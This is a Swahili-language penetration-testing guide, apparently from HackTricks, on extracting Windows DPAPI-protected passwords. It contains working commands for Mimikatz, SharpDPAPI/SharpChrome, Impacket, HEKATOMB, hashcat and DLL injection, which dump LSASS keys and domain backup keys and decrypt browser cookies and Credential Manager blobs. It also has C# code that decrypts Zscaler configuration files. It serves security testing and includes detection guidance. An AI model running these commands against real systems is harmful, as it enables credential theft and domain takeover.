# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## DPAPI ni nini

Data Protection API (DPAPI) hutumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa **usimbaji fiche wa symmetric wa funguo za faragha za asymmetric**, kwa kutumia siri za mtumiaji au mfumo kama chanzo muhimu cha entropy. Mbinu hii hurahisisha usimbaji fiche kwa watengenezaji kwa kuwawezesha kusimba data kwa kutumia ufunguo unaotokana na siri za kuingia za mtumiaji au, kwa usimbaji fiche wa mfumo, siri za uthibitishaji wa mfumo kwenye domain. Hivyo, watengenezaji hawahitaji kusimamia wenyewe ulinzi wa ufunguo wa usimbaji fiche.

Njia inayotumiwa sana kutumia DPAPI ni kupitia functions za **`CryptProtectData` na `CryptUnprotectData`**, zinazowezesha programu kusimba na kufumbua data kwa kutumia muktadha wa usalama wa process iliyoingia kwa sasa. Kwa chaguo-msingi, data inaweza kufumbuliwa tu na mtumiaji au muktadha uleule wa mfumo ulioisimba.<sup>[[2]](#references)[[3]](#references)</sup>

Functions hizi pia hukubali **entropy parameter** ya hiari inayotumika wakati wa usimbaji na ufumbuaji. Data iliyolindwa kwa kutumia entropy ya hiari inahitaji thamani hiyo hiyo ya entropy ili kufumbuliwa.<sup>[[2]](#references)[[6]](#references)</sup>

### Uzalishaji wa funguo za watumiaji

DPAPI hupata thamani mahususi ya mtumiaji (mara nyingi huitwa **pre-key**) kutoka kwenye credentials za mtumiaji. Mbinu halisi ya kuipata hutegemea akaunti na toleo la mfumo wa uendeshaji. Kwa mfano, Impacket hujaribu njia ya HMAC-SHA1 inayotumia digest ya SHA-1 ya password ya UTF-16LE, njia nyingine inayotumia MD4/NT hash ya password, na njia inayotumia PBKDF2-SHA256 kwa Protected Users. Hii ndiyo sababu zana za offline mara nyingi zinaweza kupata material inayohitajika kutoka kwenye password ya maandishi wazi au NT hash inayopatikana.<sup>[[2]](#references)[[10]](#references)</sup>

Hili linavutia hasa kwa sababu mshambuliaji akipata password hash ya mtumiaji, anaweza:

- **Kufumbua data yoyote iliyosimbwa kwa kutumia DPAPI** kwa ufunguo wa mtumiaji huyo bila kuhitaji kuwasiliana na API yoyote
- Kujaribu **ku-crack password** offline ili kupata DPAPI key sahihi

DPAPI huhifadhi **master key** moja au zaidi kwa kila mtumiaji badala ya kuunda master key mpya kwa kila blob iliyolindwa. Kila master key ina **GUID** (Globally Unique Identifier), na blob iliyosimbwa hurekodi master key iliyotumika kuilinda.<sup>[[2]](#references)</sup>

Master keys huhifadhiwa kwenye saraka ya **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Security Identifier ya mtumiaji. Faili ya master key ina material iliyolindwa kwa **pre-key** ya mtumiaji na, kwa watumiaji wa domain, material ya urejeshaji iliyolindwa kwa **domain backup key**.<sup>[[2]](#references)</sup>

Kumbuka kuwa **domain key inayotumika kusimba master key huhifadhiwa kwenye domain controllers na haibadiliki kamwe**, kwa hivyo mshambuliaji akipata ufikiaji wa domain controller, anaweza kupata domain backup key na kufumbua master keys za watumiaji wote kwenye domain.<sup>[[2]](#references)</sup>

Blobs zilizosimbwa zina **GUID ya master key** iliyotumika kusimba data kwenye headers zake.

> [!TIP]
> Blobs zilizosimbwa kwa DPAPI huanza na **`01 00 00 00`**

Tafuta master keys:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

Hivi ndivyo kundi la Master Keys za mtumiaji linavyoonekana:

![DPAPI ni nini - Uzalishaji wa funguo za watumiaji: Hivi ndivyo kundi la Master Keys za mtumiaji linavyoonekana](<../../images/image (1121).png>)

### Uzalishaji wa funguo za Machine/System

Hii ni funguo inayotumiwa na mashine kusimba data. Inategemea **DPAPI_SYSTEM LSA secret**, ambayo ni funguo maalum inayoweza kufikiwa na mtumiaji wa SYSTEM pekee. Funguo hii hutumiwa kusimba data inayopaswa kufikiwa na mfumo wenyewe, kama vile vitambulisho vya mashine au siri za mfumo mzima.<sup>[[2]](#references)</sup>

Kumbuka kwamba funguo hizi **hazina nakala rudufu ya domain**, kwa hivyo zinaweza kufikiwa ndani ya mashine pekee:

- **Mimikatz** inaweza kuifikia kwa kutoa LSA secrets kwa kutumia amri: `mimikatz lsadump::secrets`
- Siri hiyo huhifadhiwa ndani ya registry, kwa hivyo msimamizi anaweza **kubadilisha ruhusa za DACL ili kuifikia**. Njia ya registry ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Uchimbaji wa nje ya mtandao kutoka kwa registry hives pia unawezekana. Kwa mfano, ukiwa msimamizi kwenye mashine lengwa, hifadhi hives na uziexfiltrate:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Kisha kwenye kisanduku chako cha uchanganuzi, rejesha siri ya DPAPI_SYSTEM LSA kutoka kwenye hives na uitumie kusimbua DPAPI blobs za machine-scope (kwa mfano, hati tambulishi za programu zilizolindwa na mashine au profaili za Wi-Fi):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Mfano wa DPAPI maalum kwa Veeam:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Data Zinazolindwa na DPAPI

Miongoni mwa data binafsi zinazolindwa na DPAPI ni:

- Credentials za Windows
- Nywila na data ya kujaza kiotomatiki ya Internet Explorer na Google Chrome
- Nywila za akaunti za barua pepe na FTP za ndani zinazotumiwa na programu kama Outlook na Windows Mail
- Nywila za folda zinazoshirikiwa, rasilimali, mitandao isiyotumia waya na Windows Vault, pamoja na funguo za usimbaji fiche
- Nywila za miunganisho ya kompyuta za mbali, .NET Passport na funguo binafsi za madhumuni mbalimbali ya usimbaji fiche na uthibitishaji
- Nywila za mtandao zinazosimamiwa na Credential Manager na data binafsi katika programu zinazotumia CryptProtectData, kama Skype, MSN messenger na nyinginezo
- Blobs zilizosimbwa fiche ndani ya registry
- ...

Data inayolindwa na mfumo inajumuisha:
- Nywila za Wi-Fi
- ...

Nywila za scheduled task ni suala tofauti la LSA-secret. Task iliyosajiliwa kwa [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) inaweza kuhifadhi nywila kwa ajili ya urejeshaji wa akaunti ya local administrator/SYSTEM; task ya S4U au inayotumia interactive token haithibitishi kuwa nywila ilihifadhiwa. Principal na logon type ya task ni viashiria thabiti zaidi kuliko jina lake la run-as pekee.

### Chaguo za kutoa master key

- Ikiwa mtumiaji ana haki za domain admin, anaweza kufikia **domain backup key** ili kusimbua master key zote za watumiaji katika domain:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Kwa kutumia haki za msimamizi wa ndani, inawezekana **kufikia kumbukumbu ya LSASS** ili kutoa funguo kuu za DPAPI za watumiaji wote waliounganishwa na ufunguo wa SYSTEM.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Ikiwa mtumiaji ana haki za local admin, anaweza kufikia **DPAPI_SYSTEM LSA secret** ili kusimbua master keys za mashine:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Ikiwa password au hash NTLM ya mtumiaji inajulikana, unaweza **decrypt master keys za mtumiaji moja kwa moja**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Ukiwa ndani ya session ya mtumiaji, inawezekana kuiomba DC **backup key ya kusimbua master keys kupitia RPC**. Ikiwa wewe ni local admin na mtumiaji ameingia, unaweza **kuiba session token yake** kwa hili:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Orodhesha Vault

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Fikia Data Iliyosimbwa kwa DPAPI

### Tafuta data iliyosimbwa kwa DPAPI

Faili za kawaida **zilizolindwa** za watumiaji ziko katika:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Angalia pia kwa kubadilisha `\Roaming\` kuwa `\Local\` katika njia zilizo hapo juu.

Mifano ya uorodheshaji:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata blobs zilizosimbwa kwa DPAPI kwenye mfumo wa faili, registry na blobs za B64:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka kwenye repo hiyo hiyo) inaweza kutumika kusimbua data nyeti kama cookies kwa kutumia DPAPI.<sup>[[12]](#references)</sup>

#### Mapishi ya haraka ya Chromium/Edge/Electron (SharpChrome)

- Mtumiaji wa sasa, usimbuaji shirikishi wa logins/cookies zilizohifadhiwa (hufanya kazi hata kwa cookies za Chrome 127+ zilizofungwa kwenye app, kwa sababu key ya ziada hutatuliwa kutoka kwa Credential Manager ya mtumiaji inapotekelezwa kwenye muktadha wa mtumiaji):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Uchambuzi wa nje ya mtandao unapokuwa na faili pekee. Kwanza toa ufunguo wa hali ya AES kutoka kwenye "Local State" ya wasifu, kisha uutumie kusimbua DB ya cookies:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Triage ya domain nzima/ya mbali unapokuwa na DPAPI domain backup key (PVK) na admin kwenye host lengwa:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Ikiwa una DPAPI prekey/credkey ya mtumiaji (kutoka LSASS), unaweza kuruka password cracking na kusimbua data ya wasifu moja kwa moja:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Maelezo
- Matoleo mapya zaidi ya Chrome/Edge yanaweza kuhifadhi baadhi ya cookies kwa kutumia usimbaji fiche wa "App-Bound". Haiwezekani kusimbua cookies hizo mahususi offline bila ufunguo wa ziada wa app-bound; endesha SharpChrome katika muktadha wa mtumiaji lengwa ili kuupata kiotomatiki. Tazama chapisho la blogu ya usalama ya Chrome lililotajwa hapa chini.<sup>[[5]](#references)</sup>

### Funguo za ufikiaji na data

- **Tumia SharpDPAPI** kupata vitambulisho kutoka kwa faili zilizosimbwa kwa DPAPI katika kipindi cha sasa:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Pata taarifa za credentials** kama data iliyosimbwa kwa njia fiche na guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Fikia masterkeys**:

Decrypt masterkey ya mtumiaji kwa kuomba **domain backup key** kupitia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Zana ya **SharpDPAPI** pia inasaidia hoja hizi za kusimbua masterkey (kumbuka kuwa inawezekana kutumia `/rpc` kupata ufunguo wa chelezo wa domain, `/password` kutumia password ya maandishi wazi, au `/pvk` kubainisha faili ya ufunguo binafsi wa DPAPI domain...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Decrypt data kwa kutumia masterkey**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Zana ya **SharpDPAPI** pia inasaidia hoja hizi za kusimbua `credentials|vaults|rdg|keepass|triage|blob|ps` (angalia jinsi inavyowezekana kutumia `/rpc` kupata ufunguo wa chelezo wa domain, `/password` kutumia nenosiri la maandishi wazi, `/pvk` kubainisha faili ya ufunguo binafsi wa DPAPI ya domain, `/unprotect` kutumia kipindi cha sasa cha mtumiaji...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Kutumia DPAPI prekey/credkey moja kwa moja (hakuna nenosiri linalohitajika)

Ikiwa unaweza dump LSASS, Mimikatz mara nyingi huonyesha ufunguo wa DPAPI wa kila logon ambao unaweza kutumika kusimbua masterkeys za mtumiaji bila kujua nenosiri la maandishi wazi. Pitisha thamani hii moja kwa moja kwa tooling:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Fungua usimbaji fiche wa baadhi ya data kwa kutumia **session ya mtumiaji wa sasa**:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Usimbuaji fiche nje ya mtandao kwa kutumia Impacket dpapi.py

Ikiwa una SID na nenosiri la mtumiaji mwathiriwa (au NT hash), unaweza kusimbua masterkeys za DPAPI na blobs za Credential Manager ukiwa nje ya mtandao kabisa kwa kutumia Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Tambua artefacts zilizo kwenye diski:
  - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - masterkey inayolingana: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ikiwa zana za kuhamisha faili hazifanyi kazi vizuri, badilisha faili kuwa base64 kwenye mashine lengwa na unakili matokeo:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Dekripti masterkey kwa kutumia SID na nenosiri/hash ya mtumiaji:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Tumia masterkey iliyosimbuliwa kusimbua credential blob:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Workflow hii mara nyingi hupata tena taarifa za kuingia za domain zilizohifadhiwa na programu zinazotumia Windows Credential Manager, zikiwemo akaunti za kiutawala (kwa mfano, `*_adm`).

---

### Kushughulikia Entropy ya Hiari ("Entropy ya wahusika wengine")

Baadhi ya programu hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii, blob haiwezi kusimbuliwa, hata ikiwa masterkey sahihi inajulikana. Kwa hiyo, kupata entropy hiyo ni muhimu unapolenga taarifa za kuingia zilizolindwa kwa njia hii (kwa mfano, Microsoft Outlook na baadhi ya VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni DLL ya user-mode inayohook DPAPI functions ndani ya mchakato lengwa na kurekodi kwa uwazi entropy yoyote ya hiari inayotolewa. Kuendesha EntropyCapture katika hali ya **DLL-injection** dhidi ya michakato kama `outlook.exe` au `vpnclient.exe` kutatoa faili inayohusisha kila entropy buffer na mchakato wa mwito pamoja na blob. Baadaye, entropy iliyokamatwa inaweza kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili kusimbua data.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Kupasua masterkeys nje ya mtandao (Hashcat & DPAPISnoop)

Microsoft ilianzisha umbizo la masterkey la **context 3** kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desemba 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3), zinazowezesha kupasua nywila za watumiaji moja kwa moja kutoka kwenye faili ya masterkey kwa kutumia GPU. Kwa hiyo, washambuliaji wanaweza kutekeleza mashambulizi ya word-list au brute-force bila kuingiliana na mfumo lengwa.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) huendesha mchakato huu kiotomatiki:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Zana hiyo pia inaweza kuchanganua blobs za Credential na Vault, kuzifungua kwa kutumia funguo zilizopasuliwa na kutoa manenosiri ya maandishi wazi.<sup>[[8]](#references)</sup>


### Kufikia data ya mashine nyingine

Katika **SharpDPAPI na SharpChrome**, unaweza kubainisha chaguo la **`/server:HOST`** ili kufikia data ya mashine ya mbali. Bila shaka, unahitaji kuwa na uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inadhaniwa kuwa **ufunguo wa usimbaji fiche wa chelezo ya domain unajulikana**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## Zana nyingine

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni zana inayofanya kiotomatiki uchimbaji wa watumiaji na kompyuta zote kutoka kwenye LDAP directory, pamoja na uchimbaji wa ufunguo wa chelezo wa domain controller kupitia RPC. Kisha script itatatua anwani za IP za kompyuta zote na kutumia smbclient kwenye kompyuta zote ili kupata DPAPI blobs zote za watumiaji na kusimbua kila kitu kwa kutumia ufunguo wa chelezo wa domain.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Kwa kutumia orodha ya kompyuta iliyotolewa kutoka LDAP, unaweza kupata kila subnet hata kama hukuwa unazijua!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kutupa siri zinazolindwa na DPAPI kiotomatiki. Toleo la 2.x lilianzisha:<sup>[[9]](#references)</sup>

* Ukusanyaji sambamba wa blobs kutoka kwa mamia ya host
* Uchambuzi wa masterkeys za **context 3** na ujumuishaji wa kiotomatiki wa Hashcat kwa kuzivunja
* Usaidizi wa cookies zilizosimbwa kwa njia ya Chrome "App-Bound" (tazama sehemu inayofuata)
* Hali mpya ya **`--snapshot`** ya kuchunguza endpoints mara kwa mara na kulinganisha blobs mpya zilizoundwa

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni parser ya C# ya faili za masterkey/credential/vault inayoweza kutoa miundo ya Hashcat/JtR na kwa hiari kuanzisha uvunjaji kiotomatiki. Inasaidia kikamilifu miundo ya masterkey za mashine na za mtumiaji hadi Windows 11 24H1.<sup>[[8]](#references)</sup>


## Utambuzi wa kawaida

- Ufikiaji wa faili katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na saraka nyingine zinazohusiana na DPAPI.
    - Hasa kutoka kwenye network share kama **C$** au **ADMIN$**.
- Matumizi ya **Mimikatz**, **SharpDPAPI** au zana zinazofanana kufikia kumbukumbu ya LSASS au kutupa masterkeys.
- Event **4662**: *Operesheni ilifanywa kwenye object* – inaweza kuhusishwa na ufikiaji wa object ya **`BCKUPKEY`**.
- Event **4673/4674** wakati mchakato unaomba *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Athari za kiusalama na mabadiliko ya mfumo wa zana 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Novemba 2023). Mshambulizi mwenye ufikiaji wa mtandao angeweza kumhadaa mwanachama wa domain ili apokee ufunguo hasidi wa chelezo wa DPAPI, na hivyo kuwezesha kusimbua masterkeys za watumiaji. Tatizo lilirekebishwa katika sasisho limbikizi la Novemba 2023 – wasimamizi wanapaswa kuhakikisha kuwa DC na vituo vya kazi vimesasishwa kikamilifu.<sup>[[4]](#references)</sup>
* Usimbaji fiche wa cookies wa Chrome 127 “App-Bound” (Julai 2024) ulibadilisha ulinzi wa zamani uliotegemea DPAPI pekee kwa kuongeza ufunguo uliohifadhiwa chini ya **Credential Manager** ya mtumiaji. Sasa kusimbua cookies nje ya mtandao kunahitaji masterkey ya DPAPI na **ufunguo wa app-bound uliofungwa kwa GCM**. SharpChrome v2.3 na DonPAPI 2.x zinaweza kurejesha ufunguo wa ziada zinapoendeshwa katika muktadha wa mtumiaji.<sup>[[5]](#references)</sup>


### Uchunguzi kifani: Zscaler Client Connector – Entropy maalum inayotokana na SID

Zscaler Client Connector huhifadhi faili kadhaa za usanidi chini ya `C:\ProgramData\Zscaler` (kwa mfano, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila faili husimbwa kwa **DPAPI (Machine scope)**, lakini mtengenezaji hutoa **entropy maalum** ambayo *hukokotolewa wakati wa utekelezaji* badala ya kuhifadhiwa kwenye diski.<sup>[[1]](#references)</sup>

Entropy hiyo huundwa upya kutokana na vipengele viwili:

1. Siri iliyowekwa moja kwa moja ndani ya `ZSACredentialProvider.dll`.
2. **SID** ya akaunti ya Windows ambayo usanidi unahusiana nayo.

Algoriti iliyotekelezwa na DLL ni sawa na:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Kwa kuwa siri imejumuishwa ndani ya DLL inayoweza kusomwa kutoka kwenye diski, **mshambuliaji yeyote wa ndani mwenye haki za SYSTEM anaweza kutengeneza upya entropy kwa SID yoyote** na kusimbua blobs akiwa nje ya mtandao:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Usimbuaji hutoa usanidi kamili wa JSON, ikijumuisha kila **ukaguzi wa hali ya kifaa** na thamani inayotarajiwa — taarifa yenye thamani kubwa sana unapojaribu bypasses za upande wa mteja.

> TIP: artefact nyingine zilizosimbwa (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zinalindwa kwa DPAPI **bila** entropy (baiti `16` zenye thamani ya sifuri). Kwa hiyo, zinaweza kusimbuliwa moja kwa moja kwa kutumia `ProtectedData.Unprotect` mara tu marupurupu ya SYSTEM yanapopatikana.

## References

- [1] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kupita ukaguzi wa hali ya kifaa wa Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Siri za DPAPI. Uchambuzi wa usalama na urejeshaji wa data katika DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Kusoma Siri Zilizosimbwa kwa DPAPI kwa Mimikatz na C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Udhaifu wa Windows DPAPI (Data Protection Application Programming Interface) wa Spoofing](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Kuboresha usalama wa vidakuzi vya Chrome kwenye Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Uchotaji Rahisi wa Entropy ya Hiari ya DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Maelezo ya toleo la hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – hazina ya GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – ukurasa wa mradi wa PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: Matumizi mabaya ya AD ACL, kuvunja Argon2 ya KeePassXC, na usimbuaji wa DPAPI hadi kuwa msimamizi wa DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Matumizi na chaguo](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
